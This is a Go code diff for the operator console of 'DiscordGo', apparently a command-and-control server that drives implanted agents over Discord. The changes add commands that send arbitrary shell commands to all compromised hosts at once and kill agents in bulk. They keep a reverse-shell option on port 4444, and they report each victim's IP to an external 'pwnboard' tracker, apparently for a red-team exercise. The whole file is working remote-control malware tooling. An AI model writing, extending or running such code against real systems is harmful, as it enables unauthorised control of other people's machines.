@@ -1,10 +1,14 @@
 package cli
 
 import (
+	"bytes"
+	"encoding/json"
 	"fmt"
 	"io"
+	"net/http"
 	"os"
 	"strings"
+	// "time"
 
 	"DiscordGo/pkg/agents"
 	"DiscordGo/pkg/message"
@@ -17,10 +21,8 @@ import (
 
 var Prompt *readline.Instance
 
-
 //TODO: COMMAND GRouPING based on hostname
 // like send "shutdown " to all web host
-
 
 // Taking from their example
 func filterInput(r rune) (rune, bool) {
@@ -38,13 +40,18 @@ func MainCompleter() {
 	var items []readline.PrefixCompleterInterface
 
 	for _, agent := range agents.Agents {
-		items = append(items, readline.PcItem(agent.Agent.UUID))
+		items = append(items, readline.PcItem(agent.UUID))
 	}
 
 	completer = readline.NewPrefixCompleter(
 		readline.PcItem("help"),
 		readline.PcItem("exit"),
 		readline.PcItem("agents"),
+		readline.PcItem("command",
+			readline.PcItem("all"),
+			readline.PcItem("hostname")),
+		readline.PcItem("kill",
+			readline.PcItem("all")),
 		readline.PcItem("interact",
 			items...),
 	)
@@ -57,7 +64,7 @@ func AgentCompleter() {
 	var items []readline.PrefixCompleterInterface
 
 	for _, agent := range agents.Agents {
-		items = append(items, readline.PcItem(agent.Agent.UUID))
+		items = append(items, readline.PcItem(agent.UUID))
 	}
 
 	completer = readline.NewPrefixCompleter(
@@ -134,6 +141,7 @@ func Shell(dg *discordgo.Session) {
 					mainMenuHelp()
 				case "exit":
 					fmt.Println("Exiting...")
+					defer util.DB.Close()
 					os.Exit(0)
 				case "interact":
 					if len(cmd) > 1 {
@@ -151,11 +159,40 @@ func Shell(dg *discordgo.Session) {
 					}
 				case "agents":
 					listAgents()
+				case "command":
+					println(len(cmd))
+					if len(cmd) >= 3 {
+						if cmd[1] == "all" {
+							println("Sending commands to all agents")
+							for _, agent := range agents.Agents {
+								finalCmd := strings.TrimSpace(strings.Join(cmd[2:], " "))
+								message.CommandMessage(dg, agent.UUID, finalCmd)
+							}
+						} else {
+							println("Send to X group. X=hostname") //TODO
+						}
+					} else {
+						println("Usage: command <all/hostname> <command>")
+					}
+				case "kill":
+					if cmd[1] == "all" {
+						for _, agent := range agents.Agents {
+							message.KillAgent(dg, agent.UUID)
+							util.RemoveAgentFromDB(agent.UUID)
+						}
+					} else {
+						println("If you entered a name, that's mean ☹️")
+					}
+				case "db":
+					if cmd[1] == "clean" {
+						util.DropDB()
+					}
 				}
 			case "agent":
 				switch cmd[0] {
 				case "exit":
 					fmt.Println("Exiting....")
+					defer util.DB.Close()
 					os.Exit(0)
 				case "help":
 					agentMenuHelp()
@@ -166,12 +203,18 @@ func Shell(dg *discordgo.Session) {
 					Prompt.SetPrompt("\033[31mCMD[\033[32m" + focusedAgent + "\033[31m]>> \033[0m")
 					promtpState = "cmd"
 				case "shell":
-					fmt.Println("sending a shell to you on port 4444")
-					message.SendShell(dg, focusedAgent, util.GetLocalIP())
+					if len(cmd) > 1 {
+						println("Sending to port# " + cmd[1])
+						// Make sure the input is an integer
+					} else {
+						fmt.Println("sending a shell to you on port 4444")
+						// message.SendShell(dg, focusedAgent, util.GetLocalIP())
+					}
 				case "ping":
 					message.Ping(dg, focusedAgent, true)
 				case "kill":
 					message.KillAgent(dg, focusedAgent)
+					util.RemoveAgentFromDB(focusedAgent)
 					Prompt.SetPrompt("\033[31mDiscordGo>>> \033[0m")
 					promtpState = "main"
 				case "agents":
@@ -185,7 +228,11 @@ func Shell(dg *discordgo.Session) {
 				default:
 					finalCmd := strings.TrimSpace(strings.Join(cmd, " "))
 					message.CommandMessage(dg, focusedAgent, finalCmd)
-				} 
+
+					// Talk to pwnboard everytime I send a message
+					stuff, _ := agents.UseAgent(focusedAgent)
+					updatepwnBoard(stuff.IP)
+				}
 				println("yeet")
 			}
 		}
@@ -199,9 +246,10 @@ func mainMenuHelp() {
 		{"exit", "Exiting the server"},
 		{"interact <UUID>", "Something something with agent"},
 		{"agents", "List all the connected agents"},
-		{"command <group by os or hostname> <all>", "send command all agents"}, //TODO
-		{"db clean", "clean db"}, // TODO
-		{"ping all", "This ping will ping all agents"}, //TODO
+		{"kill all", "stop/remove the agents"}, 
+		{"command <group os or hostname> <all>", "send command all agents"},
+		{"db clean", "Delete database"},                          
+		{"ping all", "Ping all agents make sure they are alive"}, //TODO
 	}
 
 	table.SetHeader([]string{"Command", "Description"})
@@ -216,8 +264,8 @@ func agentMenuHelp() {
 		{"help", "Display this menu"},
 		{"exit", "Exiting the server"},
 		{"kill", "stop/remove the agent"},
-		{"interact <UUID>", "Something something with agent"}, //TODO
-		{"command", "send command to the agent"}, 
+		{"interact <UUID>", "Interact with an agent"},
+		{"command", "send command to the agent"},
 		{"shell", "send a reverse shell to us"}, // TODO: Optional to give their port #
 		{"ping", "check if the agent is alive"},
 		{"back", "Return back to main menu"},
@@ -231,36 +279,72 @@ func agentMenuHelp() {
 }
 
 func listAgents() {
+	// TODO: Fix this later: everythimg should be from the db not the array
+	agents.Agents = nil //dumb solution
+	util.LoadFromDB()
 	table := tablewriter.NewWriter(os.Stdout)
-	table.SetHeader([]string{"ID", "Hostname", "IP", "OS", "Status"})
+	table.SetHeader([]string{"ID", "Hostname", "IP", "OS", "Status", "Timestamp"})
 
 	agentList := [][]string{}
 
 	for _, agent := range agents.Agents {
 		data := []string{}
-		data = append(data, agent.Agent.UUID)
-		data = append(data, agent.Agent.HostName)
-		data = append(data, agent.Agent.IP)
-		data = append(data, agent.Agent.OS)
+		data = append(data, agent.UUID)
+		data = append(data, agent.HostName)
+		data = append(data, agent.IP)
+		data = append(data, agent.OS)
 		data = append(data, agent.Status)
-		// TODO: Add another column to tell when last heard from server
+		data = append(data, agent.Timestamp)
 
-		if agent.Status == "alive" {
+		if agent.Status == "Alive" {
 			table.SetColumnColor(tablewriter.Colors{},
 				tablewriter.Colors{},
 				tablewriter.Colors{},
 				tablewriter.Colors{},
-				tablewriter.Colors{tablewriter.FgGreenColor})
-		} else {
+				tablewriter.Colors{tablewriter.FgGreenColor},
+				tablewriter.Colors{})
+		} else if agent.Status == "Dead" {
 			table.SetColumnColor(tablewriter.Colors{},
 				tablewriter.Colors{},
 				tablewriter.Colors{},
 				tablewriter.Colors{},
-				tablewriter.Colors{tablewriter.FgRedColor})
+				tablewriter.Colors{tablewriter.FgRedColor},
+				tablewriter.Colors{})
 		}
 		agentList = append(agentList, data)
 	}
 
 	table.AppendBulk(agentList)
 	table.Render()
+}
+
+type PwnBoard struct {
+	IPs  string `json:"ip"`
+	Type string `json:"type"`
+}
+
+func updatepwnBoard(ip string) {
+	url := "http://pwnboard.win/generic"
+
+	// Create the struct
+	data := PwnBoard{
+		IPs:  ip,
+		Type: "DiscordGo",
+	}
+
+	// Marshal the data
+	sendit, err := json.Marshal(data)
+	if err != nil {
+		fmt.Println("\n[-] ERROR SENDING POST:", err)
+		return
+	}
+
+	// Send the post to pwnboard
+	resp, err := http.Post(url, "application/json", bytes.NewBuffer(sendit))
+	if err != nil {
+		fmt.Println("[-] ERROR SENDING POST:", err)
+		return
+	}
+
+	defer resp.Body.Close()
 }
